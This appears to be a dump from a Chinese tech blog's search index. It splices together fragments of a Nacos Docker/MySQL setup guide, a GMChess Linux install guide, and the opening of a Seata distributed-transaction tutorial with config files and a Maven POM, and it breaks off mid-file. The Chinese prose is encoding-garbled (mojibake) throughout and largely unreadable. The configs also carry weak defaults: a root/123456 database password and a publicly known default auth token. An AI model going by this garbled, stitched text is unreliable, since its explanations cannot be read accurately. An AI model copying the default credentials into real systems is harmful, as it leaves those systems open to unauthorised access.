utf8;# ç”¨æˆ·æˆæƒè®¿é—®# GRANT ALL ON nacos_devtest.* TO \'nacos\'@\'%\';# åˆ·æ–°æƒé™# flush privileges;# åˆ‡æ¢æ•°æ®åº“mysql&gt; use nacos_devtest;# æ‰§è¡Œæ•°æ®åº“åˆå§‹åŒ–è„šæœ¬mysql&gt; source /nacos-mysql.sql;# æŸ¥çœ‹æ•°æ®åº“è¡¨mysql&gt; show tables;+------------------------+| Tables_in_nacos_devtest |+------------------------+| config_info || config_info_aggr || config_info_beta || config_info_tag || config_tags_relation || group_capacity || his_config_info || permissions || roles || tenant_capacity || tenant_info || users |+------------------------+12 rows in set (0.00 sec)# é€€å‡ºç™»å½•MySQLmysql&gt; exit# æ–­å¼€MySQLå®¹å™¨çš„è¿æ¥# exit# é‡å¯æ‰€æœ‰å®¹å™¨# docker-compose -f example/standalone-mysql-5.7.yaml restart å®¹å™¨é‡å¯åï¼Œè‹¥åœ¨ Nacos çš„æ—¥å¿—æ–‡ä»¶é‡Œè§‚å¯Ÿåˆ°ä»¥ä¸‹å†…å®¹ï¼Œåˆ™è¯´æ˜ Nacos å¯ä»¥æ­£å¸¸å¯åŠ¨ 12345678910111213# tail -n 20 example/standalone-logs/nacos.log2020-03-12 23:01:50,062 INFO Initializing ExecutorService \'taskScheduler\'2020-03-12 23:01:50,092 INFO Exposing 16 endpoint(s) beneath base path \'/actuator\'2020-03-12 23:01:50,240 INFO Tomcat started on port(s): 8848 (http) with context path \'/nacos\'2020-03-12 23:01:50,245 INFO Started Nacos in 12.964 seconds (JVM running for 13.92)2020-03-12 23:01:50,246 INFO Nacos Log files: /home/nacos/logs2020-03-12 23:01:50,247 INFO Nacos Log files: /home/nacos/conf2020-03-12 23:01:50,247 INFO Nacos Log files: /home/nacos/data2020-03-12 23:01:50,248 INFO Nacos started successfully in stand alone mode. use external storage2020-03-12 23:01:55,147 INFO Initializing Spring DispatcherServlet \'dispatcherServlet\'2020-03-12 23:01:55,147 INFO Initializing Servlet \'dispatcherServlet\'2020-03-12 23:01:55,169 INFO Completed initialization in 22 ms Docker å±æ€§é…ç½®åˆ—è¡¨ å±æ€§åç§° æè¿° é€‰é¡¹ MODE ç³»ç»Ÿå¯åŠ¨æ–¹å¼ï¼šé›†ç¾¤ / å•æœº cluster/standalone é»˜è®¤ cluster NACOS_SERVERS é›†ç¾¤åœ°å€ p1:port1 ç©ºæ ¼ ip2:port2 ç©ºæ ¼ ip3:port3 PREFER_HOST_MODE æ”¯æŒ IP è¿˜æ˜¯åŸŸåæ¨¡å¼ hostname/ip é»˜è®¤ ip NACOS_SERVER_PORT Nacos è¿è¡Œç«¯å£ é»˜è®¤ 8848 NACOS_SERVER_IP å¤šç½‘å¡æ¨¡å¼ä¸‹å¯ä»¥æŒ‡å®š IP SPRING_DATASOURCE_PLATFORM å•æœºæ¨¡å¼ä¸‹æ”¯æŒ MYSQL æ•°æ®åº“ mysql / ç©º é»˜è®¤ï¼šç©º MYSQL_SERVICE_HOST æ•°æ®åº“è¿æ¥åœ°å€ MYSQL_SERVICE_PORT æ•°æ®åº“ç«¯å£ é»˜è®¤ : 3306 MYSQL_SERVICE_DB_NAME æ•°æ®åº“åº“å MYSQL_SERVICE_USER æ•°æ®åº“ç”¨æˆ·å MYSQL_SERVICE_PASSWORD æ•°æ®åº“ç”¨æˆ·å¯†ç  MYSQL_SERVICE_DB_PARAM æ•°æ®åº“è¿æ¥å‚æ•° default : characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true MYSQL_DATABASE_NUM It indicates the number of database é»˜è®¤ :1 JVM_XMS -Xms é»˜è®¤ :2g JVM_XMX -Xmx é»˜è®¤ :2g JVM_XMN -Xmn é»˜è®¤ :1g JVM_MS -XX:MetaspaceSize é»˜è®¤ :128m JVM_MMS -XX:MaxMetaspaceSize é»˜è®¤ :320m NACOS_DEBUG æ˜¯å¦å¼€å¯è¿œç¨‹ DEBUG y/n é»˜è®¤ :n TOMCAT_ACCESSLOG_ENABLED server.tomcat.accesslog.enabled é»˜è®¤ :false NACOS_AUTH_SYSTEM_TYPE æƒé™ç³»ç»Ÿç±»å‹é€‰æ‹©ï¼Œç›®å‰åªæ”¯æŒ nacos ç±»å‹ é»˜è®¤ :nacos NACOS_AUTH_ENABLE æ˜¯å¦å¼€å¯æƒé™ç³»ç»Ÿ é»˜è®¤ :false NACOS_AUTH_TOKEN_EXPIRE_SECONDS token å¤±æ•ˆæ—¶é—´ é»˜è®¤ :18000 NACOS_AUTH_TOKEN token é»˜è®¤ :SecretKey012345678901234567890123456789012345678901234567890123456789 NACOS_AUTH_CACHE_ENABLE æƒé™ç¼“å­˜å¼€å…³ï¼Œå¼€å¯åæƒé™ç¼“å­˜çš„æ›´æ–°é»˜è®¤æœ‰ 15 ç§’çš„å»¶è¿Ÿ é»˜è®¤ : false MEMBER_LIST é€šè¿‡ç¯å¢ƒå˜é‡çš„æ–¹å¼è®¾ç½®é›†ç¾¤åœ°å€ ä¾‹å­ï¼š192.168.16.101:8847?raft_port=8807,192.168.16.101?raft_port=8808,192.168.16.101:8849?raft_port=8809 EMBEDDED_STORAGE æ˜¯å¦å¼€å¯é›†ç¾¤åµŒå…¥å¼å­˜å‚¨æ¨¡å¼ embedded é»˜è®¤ : none å‚è€ƒèµ„æ–™ Nacos ç›‘æ§æŒ‡å— Nacos Docker é¡¹ç›® Nacos Docker ç§»é™¤ä¸»ä»é•œåƒé…ç½® Nacos Docker å¿«é€Ÿå¼€å§‹ï¼ˆå±æ€§é…ç½®çš„å†…å®¹å·²è¿‡æ—¶ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"ä¸­å›½è±¡æ£‹ä¹‹ä¸€ Linux ä¸‹çš„è±¡æ£‹è½¯ä»¶ GMChess",url:"/posts/e44e61ed.html",text:'GMChess ä»‹ç»GMChessï¼ˆå¤©ä¹¦æ£‹è°ˆï¼‰ æ˜¯ä¸€æ¬¾ç”± Lerosua ç¼–å†™çš„ Linux ä¸‹å¼€æºçš„ä¸­å›½è±¡æ£‹ç¨‹åºï¼ŒåŸºäº gtkmm å’Œ C++ å®Œæˆï¼Œä½¿ç”¨äº†è±¡æ£‹å·«å¸ˆï¼ˆxqwizardï¼‰å¼€æºçš„ ElephantEyeï¼ˆè±¡çœ¼ï¼‰ä½œä¸ºè±¡æ£‹å¼•æ“ã€‚æ”¯æŒäººæœºå¯¹æˆ˜å’Œäººäººå¯¹æˆ˜ï¼Œä½†æ˜¯æœ€åˆåªèƒ½åœ¨åŒä¸€å°æœºå­ä¸Šè¿›è¡Œäººäººå¯¹æˆ˜ï¼Œè¿™æ˜¾ç„¶å¾ˆä¸æ–¹ä¾¿ã€‚äºæ˜¯ Lerosua åˆç»™ GMChess å¼€å‘äº† pidgin ç½‘ç»œå¯¹æˆ˜æ’ä»¶ï¼Œæ”¯æŒå’Œå¥½å‹åœ¨çº¿ä¸‹è±¡æ£‹ã€‚æ³¨ï¼šæœ¬æ–‡é€‚ç”¨äº Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆ GMChess ç‰ˆæœ¬å†å² ç‰ˆæœ¬ æ—¥æœŸ è¯´æ˜ 0.10 2009 å¹´ 3 æœˆ 26 æ—¥ ä»…æœ‰è¯»è°±åŠŸèƒ½ï¼Œè¯»å– qq è±¡æ£‹ã€è”ä¼—è±¡æ£‹ã€ä¸­æ¸¸è±¡æ£‹ã€è±¡æ£‹æ¼”æ’­å®¤ç­‰è½¯ä»¶ç”Ÿæˆçš„æ£‹è°± 0.10.2 2009 å¹´ 4 æœˆ 12 æ—¥ æ·»åŠ æ£‹è°±ä¹¦ç®¡ç†åŠŸèƒ½ 0.20 2009 å¹´ 4 æœˆ 27 æ—¥ æ·»åŠ  AI å¯¹æˆ˜åŠŸèƒ½ 0.20.1 2009 å¹´ 7 æœˆ 20 æ—¥ gmchess å›¾æ ‡æŠ•ç¥¨ï¼Œå›¾æ ‡åŠå£°éŸ³æ–‡ä»¶éƒ½æ›¿æ¢æˆ GPL ç‰ˆæƒçš„æ–‡ä»¶ï¼›yalong çš„è¡¥ä¸ï¼›åˆæ­¥çš„è®¡æ—¶å™¨åŠŸèƒ½ 0.20.2 2009 å¹´ 8 æœˆ 20 æ—¥ æ›´æ–°æœ‰ç‰ˆæƒäº‰è®®çš„å›¾ç‰‡ï¼›å»é™¤ libglademm ä¾èµ–ï¼Œäº‰å–å¹¶è¿›å…¥ Debian 0.20.3 2009 å¹´ 10 æœˆ 9 æ—¥ é…ç½®ç›®å½•æ›´æ”¹ç¬¦åˆ FreeDesktop.org æ ‡å‡†ï¼Œæ·»åŠ éš¾åº¦è®¾ç½®ï¼Œæ”¹è¿›ç•Œé¢ï¼Œæ”¯æŒä½¿ç”¨é»‘æ£‹ 0.29.3 2010 å¹´ 11 æœˆ 19 æ—¥ æœªçŸ¥ 0.29.4 2011 å¹´ 10 æœˆ 15 æ—¥ æœªçŸ¥ 0.29.5 2011 å¹´ 12 æœˆ 26 æ—¥ æœªçŸ¥ 0.29.6 2011 å¹´ 12 æœˆ 28 æ—¥ æœªçŸ¥ GMChess æºç ä¸‹è½½GMChess æœ€æ–°çš„æºç å¯ä»¥åœ¨è¿™é‡Œï¼ˆè‡ªå¤‡æ¢¯å­ï¼‰ä¸‹è½½ï¼Œæ³¨æ„ gmchess-0.29.6.tar.bz2 å’Œ pidgin-gmchess-0.02.tar.gz éƒ½è¦ä¸‹è½½ç¼–è¯‘å®‰è£…ã€‚ä¸ºäº†æ–¹ä¾¿æ²¡æœ‰æ¢¯å­çš„ç½‘å‹ï¼Œæä¾›æœ¬ç«™çš„ä¸‹è½½åœ°å€ï¼š gmchess-0.29.6.tar.bz2 pidgin-gmchess-0.02.tar.gz GMChess ç¼–è¯‘å®‰è£…Centos ç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œç¼–è¯‘ GMChess æ—¶å¯èƒ½ä¼šå›  gccã€g++ ç‰ˆæœ¬å¯¹ä»£ç å­˜åœ¨å…¼å®¹é—®é¢˜ï¼Œå¯¼è‡´ç¼–è¯‘å¤±è´¥ï¼›è‡³äºå…¶ä»– Linux å‘è¡Œç‰ˆçš„ç¼–è¯‘å®‰è£…æ­¥éª¤ï¼Œå¯å‚è€ƒä¸‹è¿°å†…å®¹ï¼š 1234567891011121314# åœ¨centosç³»ç»Ÿå®‰è£…gtkmm24# yum install gtkmm24-devel# è§£å‹æºç # tar -xvf gmchess-0.29.6.tar.bz2# è¿›å…¥è§£å‹ç›®å½•# cd gmchess-0.29.6# æŒ‡å®šå®‰è£…è·¯å¾„./configure --prefix=/usr/local# ç¼–è¯‘å®‰è£…# make &amp;&amp; make install GMChess Pidgin æ’ä»¶ç¼–è¯‘å®‰è£…1234567891011121314151617181920# åœ¨centosç³»ç»Ÿå®‰è£…pidginï¼ˆäº’è”ç½‘é€šè®¯ç¨‹åºï¼‰# yum install pidgin pidgin-devel# åˆ›å»ºå­˜æ”¾pidginæ’ä»¶çš„ç›®å½•# mkdir -p /usr/lib/pidgin# è§£å‹æºç # tar -xvf pidgin-gmchess-0.02.tar.gz# è¿›å…¥è§£å‹ç›®å½•# cd pidgin-gmchess-0.02# ç¼–è¯‘å®‰è£…# make &amp;&amp; make install# æ‹·è´Gmchessçš„æ’ä»¶æ–‡ä»¶åˆ°å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ï¼ˆåŒºåˆ†ä¸åŒçš„Linuxç”¨æˆ·ï¼‰$ mkdir -p ~/.purple/plugins/$ cp gmchess-network.so ~/.purple/plugins/# æœ€åèœå•æ å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; äº’è”ç½‘ --&gt; Pidginï¼ˆäº’è”ç½‘é€šè®¯ç¨‹åºï¼‰--&gt; å·¥å…· --&gt; æ’ä»¶ --&gt; å‹¾é€‰ä¸ŠPidginçš„Gmchessæ’ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º Pidgin å¯¹å¼ˆèŠå¤©çª—å£å½“ GMChess çš„ Pidgin æ’ä»¶å®‰è£…å¥½åï¼Œåœ¨ Pidgin çš„å¥½å‹å¯¹è¯æ¡†å†…å¯çœ‹è§å·¥å…·æ å³è¾¹å¤šäº†ä¸€ä¸ª â€œå¸…â€ å­—çš„æŒ‰é’®ï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚ç‚¹å‡» â€œå¸…â€ å­—æŒ‰é’®ï¼Œå‘èµ·ä¸‹æ£‹çš„é‚€è¯·åå°±å¯ä»¥ç­‰å¯¹æ–¹å›åº”äº†ã€‚å½“å¯¹æ–¹æ”¶åˆ°è¯·æ±‚ï¼ŒæŒ‰ yes åˆ™ä¼šè‡ªåŠ¨è°ƒç”¨ GMChess å¼€å§‹æ£‹å±€ï¼ŒæŒ‰ no åˆ™æ‹’ç»åº”æˆ˜ã€‚åŒæ„åº”æˆ˜åéœ€è¦ç­‰å¾…ä¸€ä¼šï¼ŒGMChess ä¼šè‡ªåŠ¨æ‰“å¼€ï¼Œå‘èµ·è¯·æ±‚çš„ä¸€æ–¹ä¼šè‡ªåŠ¨æˆä¸ºçº¢æ–¹ï¼Œæ­¤æ—¶å°±å¯ä»¥å¼€å§‹å¯¹å¼ˆäº†ã€‚ å‚è€ƒèµ„æ–™ GMchess æ£‹åŠ›å˜å·® GMChess ä¸­å›½è±¡æ£‹è½¯ä»¶èœå•æ±‰åŒ–è¡¥ä¸åŒ… ä¸­å›½è±¡æ£‹ Gmchess çš„ MQF æ£‹è°±åŠæ£‹å­ ä¸‹ç¯‡ ä¸­å›½è±¡æ£‹ä¹‹äºŒå¼€æº AI å¼•æ“ä»‹ç» var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Seata å…¥é—¨æ•™ç¨‹ - å®æˆ˜ç¯‡ï¼ˆç”µå•†ï¼‰",url:"/posts/b0f7bd00.html",text:'ä¸Šç¯‡ - Seata å…¥é—¨æ•™ç¨‹ï¼ˆåŸºç¡€ç¯‡ï¼‰ Seata å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡ 1ã€å‰è¨€ æœ¬æ¡ˆä¾‹ä½¿ç”¨çš„æ˜¯ Seata çš„ AT æ¨¡å¼ ç”±äºç¯‡å¹…æœ‰é™ï¼Œæœ¬æ¡ˆä¾‹åªç»™å‡ºå„ä¸ªæ¨¡å—çš„æ ¸å¿ƒä»£ç å’Œé…ç½®ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼ˆç®€ç‰ˆï¼‰ ä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼Œæœ¬æ¡ˆä¾‹åªä½¿ç”¨ Nacos ä½œä¸ºæ³¨å†Œä¸­å¿ƒï¼Œä¸ä½¿ç”¨ Nacos ä½œä¸ºé…ç½®ä¸­å¿ƒï¼Œå³ä½¿ç”¨ file.conf é…ç½®æ–‡ä»¶æ¥å­˜å‚¨ TCï¼ˆSeata Serverï¼‰ç›¸å…³çš„é…ç½®ä¿¡æ¯ æœ€æ–°å‘å¸ƒçš„å†…å®¹ï¼Œå·²è¿½åŠ  TCï¼ˆSeata Serverï¼‰æ•´åˆ Nacos ä½œä¸ºé…ç½®ä¸­å¿ƒçš„æ•™ç¨‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ï¼ˆé…ç½®ä¸­å¿ƒç‰ˆï¼‰ 1.1ã€ç‰ˆæœ¬è¯´æ˜ MySQL 5.7 Nacos Server 1.4.0 Seata Server 1.4.0 Springt Boot 2.3.2.RELEASE Spring Cloud Hoxton.SR8 Spring Cloud Alibaba 2.2.3.RELEASE ç‰¹åˆ«æ³¨æ„ï¼šSpring Boot å’Œ Spring Cloud ä»¥åŠ Spring Cloud Alibaba çš„ç‰ˆæœ¬å·éœ€è¦äº’ç›¸å¯¹åº”ï¼Œå¦åˆ™å¯èƒ½ä¼šå­˜åœ¨å„ç§é—®é¢˜ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå®˜æ–¹çš„ç‰ˆæœ¬è¯´æ˜ 1.2ã€æ¡ˆä¾‹ç›®æ ‡æœ¬æ¡ˆä¾‹å°†ä¼šåˆ›å»ºä¸‰ä¸ªæœåŠ¡ï¼Œåˆ†åˆ«æ˜¯è®¢å•æœåŠ¡ã€åº“å­˜æœåŠ¡ã€è´¦æˆ·æœåŠ¡ï¼Œå„æœåŠ¡ä¹‹é—´çš„è°ƒç”¨æµç¨‹å¦‚ä¸‹ï¼š 1ï¼‰å½“ç”¨æˆ·ä¸‹å•æ—¶ï¼Œè°ƒç”¨è®¢å•æœåŠ¡åˆ›å»ºä¸€ä¸ªè®¢å•ï¼Œç„¶åé€šè¿‡è¿œç¨‹è°ƒç”¨ï¼ˆOpenFeignï¼‰è®©åº“å­˜æœåŠ¡æ‰£å‡ä¸‹å•å•†å“çš„åº“å­˜ 2ï¼‰è®¢å•æœåŠ¡å†é€šè¿‡è¿œç¨‹è°ƒç”¨ï¼ˆOpenFeignï¼‰è®©è´¦æˆ·æœåŠ¡æ¥æ‰£å‡ç”¨æˆ·è´¦æˆ·é‡Œé¢çš„ä½™é¢ 3ï¼‰æœ€ååœ¨è®¢å•æœåŠ¡ä¸­ä¿®æ”¹è®¢å•çŠ¶æ€ä¸ºå·²å®Œæˆ ä¸Šè¿°æ“ä½œè·¨è¶Šäº†ä¸‰ä¸ªæ•°æ®åº“ï¼Œæœ‰ä¸¤æ¬¡è¿œç¨‹è°ƒç”¨ï¼Œå¾ˆæ˜æ˜¾ä¼šæœ‰åˆ†å¸ƒå¼äº‹åŠ¡çš„é—®é¢˜ï¼Œé¡¹ç›®çš„æ•´ä½“ç»“æ„å¦‚ä¸‹ï¼š 12345seata-transaction-demoâ”œâ”€â”€ seata-common-api # APIæ¨¡å—â”œâ”€â”€ seata-account-service # è´¦æˆ·æ¨¡å—ï¼Œç«¯å£ï¼š2002â”œâ”€â”€ seata-storage-service # åº“å­˜æ¨¡å—ï¼Œç«¯å£ï¼š2000â””â”€â”€ seata-order-service # è®¢å•æ¨¡å—ï¼Œç«¯å£ï¼š2001 1.3ã€Seata åˆ†å¸ƒå¼äº¤æ˜“è§£å†³æ–¹æ¡ˆ 2ã€å‡†å¤‡å·¥ä½œ2.1ã€åˆå§‹åŒ–æ•°æ®åº“æœ¬æ¡ˆä¾‹ä½¿ç”¨ MySQL æ•°æ®åº“æ¥å­˜å‚¨ Seata Serverï¼ˆTCï¼‰çš„å…¨å±€äº‹åŠ¡ä¼šè¯ä¿¡æ¯ï¼Œå› æ­¤éœ€è¦æ‰§è¡Œ SQL åˆå§‹åŒ–è„šæœ¬æ¥åˆ›å»ºæœ¬æ¡ˆä¾‹éœ€è¦çš„ Seata æ•°æ®åº“ã€å¯¹åº”çš„ä¸šåŠ¡åº“ä¸ä¸šåŠ¡è¡¨ã€‚ç”±äº Seata çš„ SEATAã€AT æ¨¡å¼å‡éœ€è¦ç”¨åˆ° UNDO_LOG å›æ»šæ—¥å¿—è¡¨ï¼Œå› æ­¤åœ¨æ¯ä¸ªä¸šåŠ¡æ•°æ®åº“é‡Œéƒ½è¦å•ç‹¬åˆ›å»º UNDO_LOG å›æ»šæ—¥å¿—è¡¨ï¼Œæœ€ç»ˆæ‰€æœ‰ç”¨åˆ°çš„æ•°æ®åº“å’Œä¸šåŠ¡è¡¨å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š 2.2ã€Nacos åˆ›å»ºå‘½åç©ºé—´åœ¨ Nacos çš„æ§åˆ¶å°åˆ›å»ºæ–°çš„å‘½åç©ºé—´ï¼Œåé¢ä¼šå°†å‘½åç©ºé—´å†™åœ¨ registry.confg é…ç½®æ–‡ä»¶ä¸­ï¼Œè®© Seata Server å°†è‡ªèº«çš„æœåŠ¡æ³¨å†Œåˆ° Nacos 3ã€é…ç½® Seata Server3.1ã€åˆ›å»º file.conffile.conf æ˜¯ Seata Serverï¼ˆTCï¼‰çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºæŒ‡å®š TC çš„ç›¸å…³é…ç½®ï¼Œæ ¸å¿ƒé…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627service { vgroupMapping.seata-order-service-tx-group = "default" vgroupMapping.seata-storage-service-tx-group = "default" vgroupMapping.seata-account-service-tx-group = "default"}store { mode = "db" db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp)/HikariDataSource(hikari) etc. datasource = "druid" ## mysql/oracle/postgresql/h2/oceanbase etc. dbType = "mysql" driverClassName = "com.mysql.cj.jdbc.Driver" url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" user = "root" password = "123456" minConn = 5 maxConn = 100 globalTable = "global_table" branchTable = "branch_table" lockTable = "lock_table" queryLimit = 100 maxWait = 5000 }} â˜…file.conf å®Œæ•´é…ç½®â˜… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154transport { # tcp udt unix-domain-socket type = "TCP" #NIO NATIVE server = "NIO" #enable heartbeat heartbeat = true #thread factory for netty thread-factory { boss-thread-prefix = "NettyBoss" worker-thread-prefix = "NettyServerNIOWorker" server-executor-thread-prefix = "NettyServerBizHandler" share-boss-worker = false client-selector-thread-prefix = "NettyClientSelector" client-selector-thread-size = 1 client-worker-thread-prefix = "NettyClientWorkerThread" # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 } shutdown { # when destroy server, wait seconds wait = 3 } serialization = "seata" compressor = "none"}service { vgroupMapping.seata-order-service-tx-group = "default" vgroupMapping.seata-storage-service-tx-group = "default" vgroupMapping.seata-account-service-tx-group = "default" default.grouplist = "127.0.0.1:8091" enableDegrade = false disable = false max.commit.retry.timeout = "-1" max.rollback.retry.timeout = "-1" disableGlobalTransaction = false}client { async.commit.buffer.limit = 10000 lock { retry.internal = 10 retry.times = 30 } report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1}## transaction log store, only used in seata-serverstore { ## store mode: fileã€dbã€redis mode = "db" ## file store property file { ## store location dir dir = "sessionStore" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions maxBranchSessionSize = 16384 # globe session size , if exceeded throws exceptions maxGlobalSessionSize = 512 # file buffer size , if exceeded allocate new buffer fileWriteBufferCacheSize = 16384 # when recover batch read size sessionReloadReadSize = 100 # async, sync flushDiskMode = async } ## database store property db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp)/HikariDataSource(hikari) etc. datasource = "druid" ## mysql/oracle/postgresql/h2/oceanbase etc. dbType = "mysql" driverClassName = "com.mysql.cj.jdbc.Driver" url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" user = "root" password = "123456" minConn = 5 maxConn = 100 globalTable = "global_table" branchTable = "branch_table" lockTable = "lock_table" queryLimit = 100 maxWait = 5000 } ## redis store property redis { host = "127.0.0.1" port = "6379" password = "" database = "0" minConn = 1 maxConn = 10 maxTotal = 100 queryLimit = 100 }}lock { ## the lock store mode: localã€remote mode = "remote" local { ## store locks in user\'s database } remote { ## store locks in the seata\'s server }}recovery { #schedule committing retry period in milliseconds committing-retry-period = 1000 #schedule asyn committing retry period in milliseconds asyn-committing-retry-period = 1000 #schedule rollbacking retry period in milliseconds rollbacking-retry-period = 1000 #schedule timeout retry period in milliseconds timeout-retry-period = 1000}transaction { undo.data.validation = true undo.log.serialization = "jackson" undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = "undo_log"}## metrics settingsmetrics { enabled = false registry-type = "compact" # multi exporters use comma divided exporter-list = "prometheus" exporter-prometheus-port = 9898}support { ## spring spring { # auto proxy the DataSource bean datasource.autoproxy = false }} 3.2ã€åˆ›å»º registry.confregistry.conf ç”¨äºæŒ‡å®š TC çš„æ³¨å†Œä¸­å¿ƒå’Œ TC çš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œä½¿ç”¨ Nacos ä½œä¸ºæ³¨å†Œä¸­å¿ƒï¼Œä½† TC çš„é…ç½®ä¿¡æ¯ç›´æ¥ä» file.conf é…ç½®æ–‡ä»¶ä¸­è¯»å–ï¼Œæ ¸å¿ƒé…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021registry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" }}config { type = "file" file { name = "file.conf" }} â˜…registry.conf å®Œæ•´é…ç½®â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788registry { # file ã€nacos ã€eurekaã€redisã€zkã€consulã€etcd3ã€sofa type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" } eureka { serviceUrl = "http://localhost:8761/eureka" application = "default" weight = "1" } redis { serverAddr = "localhost:6379" db = 0 password = "" cluster = "default" timeout = 0 } zk { cluster = "default" serverAddr = "127.0.0.1:2181" sessionTimeout = 6000 connectTimeout = 2000 username = "" password = "" } consul { cluster = "default" serverAddr = "127.0.0.1:8500" } etcd3 { cluster = "default" serverAddr = "http://localhost:2379" } sofa { serverAddr = "127.0.0.1:9603" application = "default" region = "DEFAULT_ZONE" datacenter = "DefaultDataCenter" cluster = "default" group = "SEATA_GROUP" addressWaitTime = "3000" } file { name = "file.conf" }}config { # fileã€nacos ã€apolloã€zkã€consulã€etcd3 type = "file" nacos { serverAddr = "127.0.0.1:8848" namespace = "" group = "SEATA_GROUP" username = "" password = "" } consul { serverAddr = "127.0.0.1:8500" } apollo { appId = "seata-server" apolloMeta = "http://192.168.1.204:8801" namespace = "application" } zk { serverAddr = "127.0.0.1:2181" sessionTimeout = 6000 connectTimeout = 2000 username = "" password = "" } etcd3 { serverAddr = "http://localhost:2379" } file { name = "file.conf" }} 3.3ã€æ‹·è´é…ç½®æ–‡ä»¶ 1ï¼‰å°†ä¸Šé¢çš„ file.confã€registry.conf é…ç½®æ–‡ä»¶æ‹·è´åˆ° Seata Server çš„ conf ç›®å½•ä¸‹ï¼Œç›´æ¥è¦†ç›–åŸæœ‰çš„é…ç½®æ–‡ä»¶å³å¯ 2ï¼‰ç”±äºæœ¬æ¡ˆä¾‹æ²¡æœ‰ä½¿ç”¨é…ç½®ä¸­å¿ƒï¼Œå› æ­¤è¿˜éœ€è¦å°†ä¸Šé¢çš„ file.conf é…ç½®æ–‡ä»¶æ‹·è´åˆ°æ¯ä¸ª Maven å­å·¥ç¨‹çš„ src/main/resource ç›®å½•ä¸‹ 4ã€åˆ›å»º Maven çˆ¶å·¥ç¨‹åˆ›å»º Maven çˆ¶å·¥ç¨‹ï¼Œé…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œé¡¹ç›®æ•´ä½“ç»“æ„å¦‚ä¸‹ï¼š â˜…çˆ¶å·¥ç¨‹çš„ Maven é…ç½®â˜… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;groupId&gt;com.seata.study&lt;/groupId&gt;&lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;seata-common-api&lt;/module&gt; &lt;module&gt;seata-order-service&lt;/module&gt; &lt;module&gt;seata-storage-service&lt;/module&gt; &lt;module&gt;seata-account-service&lt;/module&gt;&lt;/modules&gt;&lt;!-- ç»Ÿä¸€ç®¡ç†ç‰ˆæœ¬ --&gt;&lt;properties&gt; 